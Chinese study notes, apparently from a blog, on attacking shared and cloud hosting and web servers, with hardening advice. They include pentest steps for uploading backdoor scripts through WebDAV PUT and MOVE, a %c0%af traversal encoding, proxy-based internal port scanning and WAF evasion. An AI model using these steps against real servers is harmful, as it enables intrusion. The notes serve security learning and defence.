<h5 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h5><p>攻击者伪装成某个应用程序的客户（即恶意客户），然后通过合法机制，上传恶意脚本，执行对服务器或其他用户应用程序的攻击；</p>
<p>有些共享应用程序甚至允许客户编写部分自己的代码，这也为恶意客户提供了引入恶意代码的机会；</p>
<h5 id="应用程序本身漏洞"><a href="#应用程序本身漏洞" class="headerlink" title="应用程序本身漏洞"></a>应用程序本身漏洞</h5><p>如果应用程序本身存在漏洞，则攻击者可以利用该漏洞实现攻击：</p>
<ul>
<li>利用 SQL 注入漏洞，对数据库进行查询，如果没有隔离机制，则攻击者可以读取并修改所有应用程序的数据；</li>
<li>利用路径遍历漏洞，读取和写入任意文件；</li>
<li>利用命令注入漏洞，控制服务器和其他应用程序；</li>
</ul>
<h5 id="应用程序组件漏洞"><a href="#应用程序组件漏洞" class="headerlink" title="应用程序组件漏洞"></a>应用程序组件漏洞</h5><p>由于共享应用程序允许客户做一定程度的定制，这意味着客户的定制代码可能会引入一些漏洞，攻击者可以利用这些漏洞进行攻击；</p>
<p>通常来说，共享应用程序存在多个组件，并且它们之间需要交互，常见漏洞如下：</p>
<ul>
<li>不同客户的应用程序生成的数据通常会放在某个共享的文件目录下，然后 ASP 管理员有权限进行查看；这意味着为 XSS 攻击提供了方便之门，以自己的数据中注入脚本，当 ASP 管理员查看时，触发脚本的执行，获取管理权限或者管理功能；</li>
<li>ASP 通常使用一个共享数据库保存所有的客户数据，因此一般使用某个共享组件，执行数据库的存储和查询过程，因此组件之间存在信任关系漏洞，恶意客户可以利用该信任关系获取其他用户的数据；</li>
</ul>
<p>渗透测试步骤：</p>
<ul>
<li>罗列共享应用程序为客户提供的访问机制<ul>
<li>访问机制是否使用安全协议，及安全的基础架构？</li>
<li>客户能否访问其原本不能访问的文件、数据或其他任意资源？</li>
<li>访问机制是否为客户提供 shell，接受客户的任意指令？</li>
</ul>
</li>
<li>是否为客户提供某种定制或配置共享环境的功能？该功能是否可以成为攻击目标？</li>
<li>如果应用程序支持命令、SQL 指令或任意文件，则值得仔细研究，寻找扩大攻击范围的可能性；</li>
<li>查找应用程序是否使用多个组件，如日志、管理、数据库等，检查这些组件是否存在漏洞；</li>
<li>检查应用程序所使用的数据库，使用开源工具如 NGSSquirrel 进行扫描，检查是否存在某些可利用的漏洞和缺陷；如有的话，再利用该漏洞扩大攻击范围；</li>
</ul>
<h4 id="攻击云"><a href="#攻击云" class="headerlink" title="攻击云"></a>攻击云</h4><p>越来越多的企业选择托管服务，这也意味着风险转移并聚集在了云服务商的身上，有部分安全问题已经是企业用户本身无法控制的；如果云服务商的托管服务出现漏洞，受影响的范围不再是某个应用程序或者某家企业，而是运行在托管环境中的成千上万的企业。</p>
<h5 id="系统拷贝"><a href="#系统拷贝" class="headerlink" title="系统拷贝"></a>系统拷贝</h5><p>许多应用程序会依赖操作系统来生成随机数字，云服务商通常使用某个公共的镜像来安装操作系统，因此如果攻击者获得镜像的拷贝，则可以获得用于生成随机数字的源，从而能够预测随机数字生成器的状态和生成的值；</p>
<h5 id="自助访问"><a href="#自助访问" class="headerlink" title="自助访问"></a>自助访问</h5><p>云服务商通常会提供某个管理云资源的自助页面，用户通过网页登录自助管理页面；如果登录过程存在访问控制漏洞，则攻击者有机会控制用户的云资源；</p>
<h5 id="永久访问令牌"><a href="#永久访问令牌" class="headerlink" title="永久访问令牌"></a>永久访问令牌</h5><p>用户需要管理云资源，为了避免频繁输入密码，用户一般会在本地保存某个令牌，用于登录验证；如果攻击者能够获取该令牌，则就能访问用户的云资源；</p>
<h5 id="Web-存储扩展"><a href="#Web-存储扩展" class="headerlink" title="Web 存储扩展"></a>Web 存储扩展</h5><p>云服务端提供的云存储功能是一个卖点，但它也意味着用户需要能够通过网页访问其存储的数据，因此云服务商在展示数据时，需要让数据支持某种浏览器扩展，而这些扩展可能存在漏洞；</p>
<h3 id="保障共享环境的安全"><a href="#保障共享环境的安全" class="headerlink" title="保障共享环境的安全"></a>保障共享环境的安全</h3><p>共享环境由于天然存在卧底和猪队友两种情形，因此需要特别留意访问控制、访问隔离和信任关系等问题；</p>
<h4 id="保障客户访问的安全"><a href="#保障客户访问的安全" class="headerlink" title="保障客户访问的安全"></a>保障客户访问的安全</h4><ul>
<li>访问机制需要使用严格的身份确认机制（目测阿里云和腾讯云都使用了双层验证机制，即增加了预留手机号的短信验证）；</li>
<li>仅给用户分配使用某个功能的最低权限；如果仅限于访问其私有目录；如果共享数据库，则确保其账户无法访问其他用户的数据；</li>
<li>如果使用某个定制的应用程序提供访问，则除了满足最严格的安全要求外，还需要对其进行测试；</li>
</ul>
<h4 id="隔离客户功能"><a href="#隔离客户功能" class="headerlink" title="隔离客户功能"></a>隔离客户功能</h4><p>由于存在恶意客户的可能性，因此需要隔离每个客户使用的功能，确保单个客户无法攻击其他客户，常见措施如下：</p>
<ul>
<li>为每个客户单独建立一个操作系统账号，并且该账号仅允许读取和写入为该客户分配的目录；</li>
<li>仅允许使用最低权限的少数操作系统命令；</li>
<li>为每个客户分配单独的数据库实例，仅向客户分配最低权限的账号，只允许访问私有的数据；</li>
</ul>
<blockquote>
<p>PHP 6 之前的版本使用安全模式来降低脚本权限，但是模式有漏洞，如果能够运行 php 命令，则可以尝试通过 phpinfo 命令获取版本信息；然后根据得到的信息，了解安全模式是否激活，以及上网搜索可利用的漏洞情况；</p>
</blockquote>
<h4 id="隔离共享应用程序中的组件"><a href="#隔离共享应用程序中的组件" class="headerlink" title="隔离共享应用程序中的组件"></a>隔离共享应用程序中的组件</h4><p>共享应用程序，例如 ASP 服务提供商提供的程序，通常使用大量的共享组件和客户定制组件。组件之间应减少信任关系，例如共享组件不可信任由客户定制组件发出的数据，并应对其进行严格的安全测试；</p>
<blockquote>
<p>应特别注意共享日志与管理功能；</p>
</blockquote>
<h2 id="小结-11"><a href="#小结-11" class="headerlink" title="小结"></a>小结</h2><p>如果共享环境的安全机制做得好的话，可以帮助应用程序的开发者提高安全性，但是它也不可避免引入了一些难以解决的新问题。因为整个共享环境的安全从某种程度来说依赖于某个薄弱应用程序的最短板。攻击者通过攻击某个存在漏洞的应用程序，或者直接部署一个恶意程序，然后利用它来攻击整个共享环境；</p>
<h1 id="18-攻击-Web-服务器"><a href="#18-攻击-Web-服务器" class="headerlink" title="18. 攻击 Web 服务器"></a>18. 攻击 Web 服务器</h1><p>绝大多数 Web 应用程序都基于某种技术栈进行开发，并运行于某个 Web 服务器程序的背后；这样做的好处是可以极大的提高开发效率，开发者只关注业务逻辑本身即可，同时将大量通用的功能交由技术栈中的组件进行处理；但这也意味着风险，因为如果这些技术栈本身存在漏洞的话，攻击者就可以利用漏洞向应用程序发起攻击；</p>
<h2 id="Web-服务器配置缺陷"><a href="#Web-服务器配置缺陷" class="headerlink" title="Web 服务器配置缺陷"></a>Web 服务器配置缺陷</h2><p>Web 服务器通常含有大量的默认配置项，但是这些默认配置项本身可能存在着风险，如果开发者没有对其进行修改和强化的话，攻击者就有可能利用这些漏洞；</p>
<h3 id="默认密码"><a href="#默认密码" class="headerlink" title="默认密码"></a>默认密码</h3><p>许多 Web 服务器程序包含管理接口，以便开发者访问并对服务器进行管理，有些接口位于某个默认的路径，有些则是运行在 8080 或者 8443 端口，并且使用默认密码</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210420085013.png"></p>
<p>更有趣的是，除了服务器程序外，还有大量的设备使用禁止修改其默认密码的接口，例如交换机、打印机、无线AP 等；</p>
<blockquote>
<p>以下两个网址收集了各种使用默认密码的场景：</p>
<p><a target="_blank" rel="noopener" href="http://www.cirt.net/passwords">www.cirt.net/passwords</a></p>
<p><a target="_blank" rel="noopener" href="http://www.phenoelit-us.org/dpl/dpl.html">www.phenoelit-us.org/dpl/dpl.html</a></p>
</blockquote>
<p>渗透测试步骤：</p>
<ul>
<li>在解析应用程序的环节，留心应用程序所使用的 Web 服务器程序和相关技术，以确认是否包含可访问的管理接口；</li>
<li>对 Web 服务器进行端口扫描，探查指向目标应用程序的所有管理接口；</li>
<li>找到接口后，查阅相关文档，了解这些接口所使用的默认密码；使用 Metasploit 的内置数据库扫描服务器；</li>
<li>如果默认密码无效，则尝试猜测有效的密码；</li>
<li>如果能够访问管理接口，则解析所有可用的功能， 看是否可以加以利用，进一步攻破主机和应用程序；</li>
</ul>
<h3 id="默认内容"><a href="#默认内容" class="headerlink" title="默认内容"></a>默认内容</h3><p>由于 Web 服务器程序是开源的，那么这同时意味着该程序有着丰富的文档内容和教程，可被攻击者利用，例如：</p>
<ul>
<li>方便开发者调试的功能；</li>
<li>用于演示某些常见任务的样本功能；</li>
<li>开发者忘了禁止公共访问的某些隐藏的强大功能；</li>
<li>文档</li>
</ul>
<h4 id="调试功能"><a href="#调试功能" class="headerlink" title="调试功能"></a>调试功能</h4><p>调试功能对攻击者非常有用，因为它会展示大量配置信息和应用程序的状态；例如调用 Apache 自带的 phpinfo 文件，就会返回 php 程序的相关信息，例如配置项、版本号、文件路径等；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210421073239.png"></p>
<h4 id="样本功能"><a href="#样本功能" class="headerlink" title="样本功能"></a>样本功能</h4><p>许多服务器程序会提供一些样本脚本，来演示如何调用服务器的相关功能。由于是基于演示的目的，为了让读者容易理解，这些脚本一般会特意编写的比较简单，但这也意味着攻击者可以利用里面可能存在的安全漏洞；</p>
<blockquote>
<p> 示例1：Jetty 7.0.0 版本的 Dump Servlet 可以通过 /test/jsp/dump.jsp 的 URL 访问，攻击者可以在 URL 标签中注入脚本代码；</p>
</blockquote>
<blockquote>
<p> 示例2：Tomcat 的 Session Example 脚本可用于修改会话变量，攻击者可以利用它来攻击用户的会话，查看会话中的敏感信息，并修改会话，让应用程序执行开发者预期外的行为；</p>
<p> <img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210421074334.png"></p>
</blockquote>
<h4 id="隐藏功能"><a href="#隐藏功能" class="headerlink" title="隐藏功能"></a>隐藏功能</h4><p>许多服务器程序使用和应用程序本身相同的 HTTP 端口来进行部署，常常只要提供正确的密码，就可以访问这些功能；许多黑客的攻击方法简单粗暴，总结为三板斧：</p>
<ul>
<li>扫描端口+默认密码</li>
<li>上传恶意文件</li>
<li>执行恶意文件，获得 shell</li>
</ul>
<h4 id="管理功能-JMX"><a href="#管理功能-JMX" class="headerlink" title="管理功能 JMX"></a>管理功能 JMX</h4><p>JBoss 自带的 JMX 控制台提供了大量关于构建和部署程序的功能，因此里面也隐藏了很多安全漏洞；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210421081648.png"></p>
<blockquote>
<p>例如使用 DeploymentFileRepository 的 store 方法上传包含恶意代码的 WAR 文件；通过 Metasploit 等工具可以很方便高效的利用这类漏洞；</p>
</blockquote>
<h4 id="数据库网关-PL-SQL"><a href="#数据库网关-PL-SQL" class="headerlink" title="数据库网关 PL/SQL"></a>数据库网关 PL/SQL</h4><p>Oracle 服务器程序提供的 PL/SQL 网关产品，功能很强大，它提供了向数据库发送请求的接口，可以根据开发者提供的请求参数，转化成 SQL 请求发给数据库，简化开发者的工作；但是这也意味着攻击者可以利用它来实施数据库查询；虽然 Oracle 使用了白名单来作为补丁，但是仍然难以攻击者借道白名单之外的其他强大功能来实现攻击；</p>
<p>渗透测试步骤：</p>
<ul>
<li>可以使用 Nikto 等工具来确定应用程序自带的默认内容；</li>
<li>利用搜索引擎确定应用程序使用的技术栈和相关的默认内容；</li>
<li>在本地安装这些技术，从中查找潜在的默认功能漏洞，并进行调试；</li>
</ul>
<h3 id="目录列表"><a href="#目录列表" class="headerlink" title="目录列表"></a>目录列表</h3><p>当请求的资源是某个目录的名称，而不是某个文件名称时，不同的应用程序可能会有不同的响应方式，常见的有3种：</p>
<ul>
<li>返回  403，表示请求被禁止；</li>
<li>返回一个默认文件，例如 index；</li>
<li>返回目录中的文件列表（有些程序用它来做内容导航）；</li>
</ul>
<p>返回文件列表有两个安全隐患：</p>
<ul>
<li>一些敏感文件不小心在列表中被泄露，例如日志文件、备份文件、旧的脚本文件等；</li>
<li>开发者可能忘了对文件实施正确的访问控制，因为预期攻击者不知道这些文件的路径；</li>
</ul>
<p>渗透测试步骤：</p>
<ul>
<li>向 Web 服务器上的每一个目录发送请求；</li>
<li>从响应中找出会返回目录列表的路径；</li>
</ul>
<blockquote>
<p>攻击者还可以通过已经发现的漏洞，让服务器返回文件列表；</p>
</blockquote>
<h3 id="HTTP-云存储"><a href="#HTTP-云存储" class="headerlink" title="HTTP 云存储"></a>HTTP 云存储</h3><p>由于云存储越来越普及，因此开发者需要提供一套基于 HTTP 协议的方法，让用户对分页式存储的文件进行访问和操作，WebDAV 就是一种常见的解决方案；</p>
<p>除了 GET 和 POST 外，WebDAV 通常还支持以下方法：PUT 上传文件、DELETE 删除文件、COPY 复制文件、MOVE 移动文件、SEARCH 搜索文件、PROPFIND 获取文件头信息；</p>
<blockquote>
<p>可以使用 OPTIONS 方法获取某个特定目录支持的所有 HTTP 方法；</p>
</blockquote>
<p>其中最危险的是 PUT 方法，因为它意味着攻击者可以上传恶意脚本；通常应用程序会对目录访问实施一定的权限控制，因此需要在测试过程中进行递归检查，找到被开发者漏洞的目录；</p>
<blockquote>
<p>除了权限控制外，WebDAV 一般会基于某些脚本文件后缀名来限制用户上传的文件类型，从而避免引入恶意代码；但是 HTML 和 JAR 文件一般被允许，这意味着攻击者利用这两种类型的文件即可实现攻击；</p>
</blockquote>
<p>渗透测试步骤：</p>
<ul>
<li>使用第三方工具，例如 Burp Repeater 发送请求；</li>
<li>使用 OPTIONS 方法列出服务器支持的 HTTP 方法；不可完全相信 OPTIONS 请求的结果，因为实际上支持的方法取决于应用程序，而不是服务器程序；因此需要对所有可用和不可用的方法，都进行测试；</li>
<li>发现可用的方法后，先尝试上传良性文件，再尝试上传后门脚本；</li>
<li>如果发现脚本后缀被限制，则可以改成 txt 后上传；待上传成功后，再使用 MOVE 命令改成正确的后缀名；</li>
<li>如果以上方法都不行，则尝试上传 HTML 和 JAR 文件；</li>
<li>使用 davtest.pl 之类的工具自动遍历所有目录；</li>
</ul>
<h3 id="代理服务器"><a href="#代理服务器" class="headerlink" title="代理服务器"></a>代理服务器</h3><p>如果 Web 服务器不直接对外提供服务，而是仅作为代理服务器，那么可能存在以下攻击面：</p>
<ul>
<li>访问未在公网上暴露的内部网络；</li>
<li>转发恶意请求，隐藏攻击者的身份；</li>
<li>访问代理服务器上运行的其他服务，利用信任关系避开防火墙的限制；</li>
</ul>
<p>如果 Web 服务器负责转发请求，当给它发一个完整 URL 的 GET 请求时，请求将会被转发到目标主机；但也有一些服务器没有转发，而是从自己的根目录中返回被请求的资源；</p>
<p>尝试使用 CONNECT 方法连接目标主机和端口号，如果服务器做出正确的响应，则说明它在代理到目标主机的连接；当连接建立以后，就可以尝试攻击非 HTTP 服务；但是，大多数服务器对可用端口做出严格的限制，一般只能访问 443 端口，无法访问其他端口；但是也说不定，有些开发者可能没有仔细配置，导致其他端口也暴露了；</p>
<p>渗透测试步骤：</p>
<ul>
<li>使用 GET 和 CONNECT 请求，尝试用 Web 服务器作为代理服务器，连接因特网上的其他服务器，核对返回的响应内容；</li>
<li>当使用 CONNECT 建立连接后，尝试在请求中的 HOST 字段中指定不同的 IP 地址和端口号，扫描其本地可用服务；并在请求中指定 127.0.0.1 作为目标主机，连接 Web 服务器上的可用端口号；</li>
</ul>
<h3 id="虚拟主机配置缺陷"><a href="#虚拟主机配置缺陷" class="headerlink" title="虚拟主机配置缺陷"></a>虚拟主机配置缺陷</h3><p>当 Apache 代理多个站点时，一般配置文件的内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *&gt;</span></span><br><span class="line">	ServerName eis</span><br><span class="line">    DocumentRoot /var/www2</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个配置文件的问题在于，它仅说明了特定 Web 站点的配置选项，却忘了 Web 服务器本身是有默认站点值的，该默认站点的值并未进行配置或修改，因此攻击者可以通过访问默认的虚拟站点进行攻击；</p>
<p>渗透测试步骤：</p>
<ul>
<li>使用以下方式向根目录提交 GET 请求<ul>
<li>正确的 Host 消息头；</li>
<li>随意的 Host 消息头；</li>
<li>Host 消息头中的服务器 IP  地址；</li>
<li>无 Host 消息头；</li>
</ul>
</li>
<li>进行以上请求的响应内容；一般来说，在 Host 消息头中指定 IP 地址可获得目录列表，以及各种默认的内容；</li>
<li>如果观察到不同的行为，使用造成异常行为的 Host 消息头重复解析过程，并使用 Nikto 等工具的 -vhost 选项进行扫描，尝试找到任何的默认内容；</li>
</ul>
<h3 id="保障-Web-服务器配置的安全"><a href="#保障-Web-服务器配置的安全" class="headerlink" title="保障 Web 服务器配置的安全"></a>保障 Web 服务器配置的安全</h3><p>疏忽大意和没有安全意识，是造成 Web 服务器漏洞的主要原因，因此在使用某个 Web 服务器软件之前，有必要对其文档进行深入的学习，以及相关的安全强化指南等教程；</p>
<p>常见配置问题如下：</p>
<ul>
<li>修改任何默认的密码，删除任何不必要的账户；</li>
<li>对非标准端口设置防火墙，禁止公众访问；</li>
<li>对 Web 根目录所指向的路径实施访问控制；</li>
<li>删除与应用程序无关的不必要的默认内容和功能（可使用 Nikto 工具进行重复检查）；</li>
<li>如果部分默认功能需要保留，则应相应的进行安全强化，禁止不必要的选项和行为；</li>
<li>如果可能，关掉整个 Web 服务器的目录列表功能；确保每个可访问目录包含服务器默认提供的 index.html 文件；</li>
<li>除应用程序必须的方法外，禁用所有其他方法；</li>
<li>确保没有将 Web 服务器配置为代理服务器；如果一定要开启代理功能，则应只允许它连接特定主机和端口；并添加网络层的过滤，控制服务器向外发送的请求；</li>
<li>如果 Web 服务器支持虚拟主机，则应同时确保主机上完成了 Web 服务器需要的相关配置，以确保 Web 服务器的安全强化措施确实得以实现；</li>
</ul>
<h2 id="易受攻击的服务器软件"><a href="#易受攻击的服务器软件" class="headerlink" title="易受攻击的服务器软件"></a>易受攻击的服务器软件</h2><p>由于攻守双方的博弈，随着时间推移，主流 Web 服务器平台变得日渐可靠，但由于 Web 服务器软件仍然在不断发展，因此新的漏洞仍然在不断产生，大多数新漏洞存在于以下软件中：</p>
<ul>
<li>IIS 和 Apache 的服务端扩展；</li>
<li>从头新开发的 Web 服务器（由于产品很新，之前较少受到黑客关注，因此容易隐藏未发现的漏洞）；</li>
</ul>
<h3 id="应用程序框架缺陷"><a href="#应用程序框架缺陷" class="headerlink" title="应用程序框架缺陷"></a>应用程序框架缺陷</h3><p>多年来，Web 应用程序框架一直存在着各式各样的缺陷，示例如下：.NET 填充提示漏洞</p>
<p>.NET 加密过程：</p>
<ol>
<li>选择一段明文信息；</li>
<li>计算信息长度，得到应填充的字符数量；</li>
<li>填充相应的字符数到消息中</li>
<li>对填充后的明文信息分成相等大小的多个小组</li>
<li>将第一个小组与初始向量（某个初始值）进行 XOR 运算（初始向量或许也可以看做是第 0 个分组）；</li>
<li>对第一个小组的 XOR 运算结果进行 3DES 加密，得到第一个小组的加密值；</li>
<li>选择第二个小组，与上一个小组的加密值进行 XOR 运算；</li>
<li>对第二个小组的 XOR 运算结果进行 3DES 加密，得到第二个小组的加密值；</li>
<li>选择第三个小组，重复第 7 和第 8 两个步骤；</li>
</ol>
<p>上面这个加密过程本身并没有什么漏洞，但好死不死的是曾经的 .NET 版本还有另外一个看似无害的信息泄露漏洞，即如果 .NET 在请求参数中发现加密填充错误，则应用程序会返回 HTTP 500 状态码。因此，攻击者可以利用这个信息泄露漏洞，逐位的进行试错，破解初始向量 IV；之后攻击者除了可以利用 IV 解密信息外，还可以利用它来加密信息，并利用框架对该加密值的信任关系，执行恶意指令；</p>
<blockquote>
<p>教训：两个或者多个看似无害的漏洞，组合起来可能变得非常的有害；</p>
</blockquote>
<h3 id="内存管理漏洞"><a href="#内存管理漏洞" class="headerlink" title="内存管理漏洞"></a>内存管理漏洞</h3><p>考虑到性能，多数服务器程序是使用编译型语言编写的，这也意味着它们很可能存在缓冲区溢出漏洞；</p>
<ul>
<li>Apache mod_isapi 悬挂指针：2010 年版本的 Apache 在遇到错误时，系统将从内存中强制卸载 mod_isapi，但是函数指针仍然保留在内存中，这意味着攻击者可以调用该指针，访问其指向的内容；</li>
<li>Microsoft IIS  ISAPI 扩展：2001 年该漏洞使得攻击者可以在 Local System 权限下执行任意代码；2008 年该扩展被发现了另外一个漏洞；</li>
<li>Apache 分块编码溢出：2002年，被发现存在整数符号错误造成的漏洞；2010年，被发现 mod_proxy 在处理 HTTP 响应的分块编码时，存在整数溢出；</li>
<li>WebDAV 溢出；</li>
</ul>
<h3 id="编码与规范化漏洞"><a href="#编码与规范化漏洞" class="headerlink" title="编码与规范化漏洞"></a>编码与规范化漏洞</h3><p>一个请求到达服务器后，可能会被很多层的组件进行处理，例如服务器程序、应用程序业务逻辑、第三方库、操作系统等；这些组件可存在使用不同的编码处理方式，导致攻击者有机会利用这种差异避开过滤或者造成程序的异常行为；</p>
<ul>
<li>Apple iDisk Server 路径遍历漏洞：攻击者可以将路径遍历指令编码到请求参数中；</li>
<li>Ruby WEBrick Web 服务器遍历漏洞：详见 <a target="_blank" rel="noopener" href="http://www.securityfocus.com/bid/28123">http://www.securityfocus.com/bid/28123</a></li>
<li>Java Web 服务器目录遍历：JVM 不对 UTF-8 进行解码，因此攻击者通过 UTF-8 编码的 ../ 可实现路径编码，详见：<a target="_blank" rel="noopener" href="https://tomcat.apache.org/security-6.html">https://tomcat.apache.org/security-6.html</a></li>
<li>Allaire JRun 目录列表漏洞：JRun 会将 url 中以 jsp 结尾的请求，转发给负责 JSP 文件的组件处理，而该组件会对文件名进行 URL 解码，如果文件名是一个问号，则会当作查询关键字，查询目录内容并返回；详见 <a target="_blank" rel="noopener" href="https://www.securityfocus.com/bid/3592">https://www.securityfocus.com/bid/3592</a></li>
<li>Jetty 也存在类似上例的漏洞，详见：<a target="_blank" rel="noopener" href="https://www.kb.cert.org/vuls/id/402580">https://www.kb.cert.org/vuls/id/402580</a></li>
<li>Microsoft IIS Unicode 路径遍历漏洞：攻击者通过提交 ../ 的各种非常 Unicode 编码形式来避开过滤；虽然 IIS 本身对路径遍历实施过滤，但是难以全面覆盖各种非法的形式；</li>
<li>WebDAV 也存在类似上例的漏洞，攻击者通过在请求路径中插入 %c0%af，实现对受 ISS 保护文件的下载；</li>
<li>避开 Oracle PL/SQL 的过滤列表：虽然 Oracle 使用了过滤名单，但是攻击者通过将恶意指令进行编码，避开过滤清单的匹配，同时编码后的指令仍然可以由后端数据库进行解码并正确执行；这种漏洞普通存在，根本原因在于前端检查基于字符串匹配，但是后端却接受各种奇怪怪的编码形式，防不胜防，详见：<a target="_blank" rel="noopener" href="http://www.securityfocus.com/archive/1/423819/100/0/threaded">http://www.securityfocus.com/archive/1/423819/100/0/threaded</a></li>
</ul>
<h3 id="查找-Web-服务器漏洞"><a href="#查找-Web-服务器漏洞" class="headerlink" title="查找 Web 服务器漏洞"></a>查找 Web 服务器漏洞</h3><p>本章描述的各种漏洞由于时间悠久，因此这些版本的新版本可能都已经修复了以上漏洞，但重要的是背后的思路和本质。一般可以先从使用自动化扫描工具开始，对服务器程序进行测试，例如 Nessus；</p>
<p>另外还可以从以下站点查找最新的漏洞消息：</p>
<ul>
<li>Security Focus</li>
<li>OSVDB</li>
<li>Bugtraq 和 Full 邮件列表</li>
</ul>
<p>当发现一些新漏洞后，再看一下 Exploit Database 和 Metasploit，看是否有人已经开始探查该漏洞；</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.exploit-db.com/">www.exploit-db.com</a></li>
<li><a target="_blank" rel="noopener" href="http://www.metasploit.com/">www.metasploit.com</a></li>
<li><a target="_blank" rel="noopener" href="http://www.grok.org.ukfull-disclosure/">www.grok.org.ukfull-disclosure</a></li>
<li><a target="_blank" rel="noopener" href="http://osvdb.org/search/advsearch">http://osvdb.org/search/advsearch</a></li>
</ul>
<blockquote>
<p> 如有可能，应该在本地安装目标软件进行测试，查找已知的广泛流传的漏洞，或者其他尚未发现的漏洞；</p>
</blockquote>
<h3 id="保障-Web-服务器软件的安全"><a href="#保障-Web-服务器软件的安全" class="headerlink" title="保障 Web 服务器软件的安全"></a>保障 Web 服务器软件的安全</h3><p>由于 Web 服务器软件通常是由第三方进行开发的，因此本质上来讲，客观存在一定程度的不可控因素。但是开发人员仍然可以采取一些有效的预防措施，降低风险的概率，包括如下：</p>
<h4 id="选择记录良好的软件"><a href="#选择记录良好的软件" class="headerlink" title="选择记录良好的软件"></a>选择记录良好的软件</h4><p>记录良好的标志包括：</p>
<ul>
<li>存在严重漏洞的数量；</li>
<li>供应商是否及时修复这些漏洞并发布补丁；</li>
</ul>
<h4 id="应用供应商发布的补丁"><a href="#应用供应商发布的补丁" class="headerlink" title="应用供应商发布的补丁"></a>应用供应商发布的补丁</h4><p> 有责任的供应商都会定期发布补丁，有时候问题是供应商内部自己发现的，有时候是由外部人员告知的。当补丁发布后，通过逆向工程很快就可以查找该补丁所要解决的问题所在，之后黑客便可以根据补丁所要修复的问题，对那些还未进行更新的应用程序发起攻击；</p>
<h4 id="实施安全强化"><a href="#实施安全强化" class="headerlink" title="实施安全强化"></a>实施安全强化</h4><p>开发人员除了认真查看 Web 服务器软件中的强化指南外，还需要采取以下强化措施：</p>
<ul>
<li>禁用一切不必要的功能。余下功能则应尽可能配置成严格执行的模式，可使用 IIS Lockdown 等工具来完成这个工作；</li>
<li>如有编译型语言编写的组件，则考虑是否改由解释型语言编写；如果不能，则应使用解释型语言的代码，对用户的输入进行检查过滤，确保安全后，再转发给编译型的组件；</li>
<li>对开启的功能进行重命名，这种模糊处理虽然不能从根本上解决问题，但可以防御一些自动化工具和一些新手；</li>
<li>实施最低权限原则，例如使用最低权限的操作系统账户，在 UNIX 环境中使用 chroot 环境以限制攻击的范围；</li>
</ul>
<h4 id="监控新的漏洞"><a href="#监控新的漏洞" class="headerlink" title="监控新的漏洞"></a>监控新的漏洞</h4><p>安排专职人员监控 Bugtraq 和 Full Disclosure 等网站，第一时间了解漏洞消息，并有效的进行改进；</p>
<h4 id="使用多层防御"><a href="#使用多层防御" class="headerlink" title="使用多层防御"></a>使用多层防御</h4><p>实施多层的保护，以便万一 Web 服务器被攻破了，也能够最大程度的减少损失；常见措施包括：</p>
<ul>
<li>限制 Web 服务器对其他应用程序组件的访问权限，例如只允许服务器账户使用数据库的 INSERT 功能，这样可以避免攻击者删除日志记录；</li>
<li>对进出 Web 服务器的流量实施严格的网络过滤；</li>
<li>使用入侵检测系统，以第一时间发现入侵行为；攻击者在攻破 Web 服务器后，一般会尝试建立反向连接，或者扫描DMZ 网络中的其他主机；入侵检测系统可以第一时间探查这些行为，并发出警报；</li>
</ul>
<h2 id="Web-应用程序防火墙"><a href="#Web-应用程序防火墙" class="headerlink" title="Web 应用程序防火墙"></a>Web 应用程序防火墙</h2><p>大多数应用程序都受到某种外部组件的保护，这些组件通常安装在相同主机上面，或者网络设备上面，提供入侵防御或入侵检测的功能。但实际上，它们能够发挥的效果非常的有限，但却给人们造成了更加安全的错觉，从而可能放松了警惕；这类组件的原理基本类似，它们都是基于特定的常见攻击荷载，而不是基于利用漏洞的常规方法</p>
<p>渗透测试步骤：</p>
<p>可以使用以下方法推断是否安装了 Web 应用程序防火墙</p>
<ul>
<li>选择应用程序某个会在响应中返回所请求的参数值的 URL，提供一个随机的参数名，并在参数值中包含有效的攻击荷载；如果应用程序阻止了攻击请求，则说明很可能有外部防御组件；</li>
<li>如果某个请求参数值会在响应中返回，则修改该参数值，提交一系列模糊测试字符串，以及这些字符串的编码形式，观察响应结果，与原始请求参数进行比对，了解应用程序对请求参数的过滤检查机制；</li>
<li>针对参数的过滤检查机制，设计有效的攻击荷载，再次发起请求，确认是否存在入侵检测行为；</li>
</ul>
<p>通过提交以下字符串，尝试避开应用程序的防火墙：</p>
<ul>
<li>根据 IDP 入侵检测程序的工作原理，可以相应的设计出不会被其关键字库匹配到的字符串，作为攻击荷载，例如避免在 XSS 攻击中出现 &lt;script&gt; 字样或者 alert、xss 等字样；</li>
<li>如果特定的请求被阻止，则可以尝试在请求中的不同位置放入相同的参数，例如 GET 请求的 URL，POST 请求的消息体、POST 请求的 URL、cookie、页面隐藏参数等（详见第 4 章）；</li>
<li>找到接受非标准格式（如序列化和编码）参数的位置，提交攻击荷载；</li>
<li>将攻击荷载分布到多个参数中进行提交；</li>
<li>使用字符串串联功能来提交（例如 ASP.NET 的 HPP 功能）；</li>
</ul>
<h1 id="19-查找源代码中的漏洞"><a href="#19-查找源代码中的漏洞" class="headerlink" title="19. 查找源代码中的漏洞"></a>19. 查找源代码中的漏洞</h1><p>如果有机会源代码的话，那么只要掌握一些常用的技巧，即使不是专业的编程人员，也能够从源代码中发现很多潜在漏洞；</p>
<h2 id="代码审查方法"><a href="#代码审查方法" class="headerlink" title="代码审查方法"></a>代码审查方法</h2><h3 id="黑盒测试与白盒测试"><a href="#黑盒测试与白盒测试" class="headerlink" title="黑盒测试与白盒测试"></a>黑盒测试与白盒测试</h3><p>黑盒和白盒各有其优缺点，由于黑盒可以使用自动化的攻击工具，因此在大多数情况下，其发现漏洞的效率比较高，毕竟阅读源代码本身需要花费很多时间。但有少数漏洞则是阅读源代码就能直接发现漏洞，黑盒反而需要很长时间，例如一个通用的后门密码会明文的写在源代码中，但是通过黑盒测试很难发现它；</p>
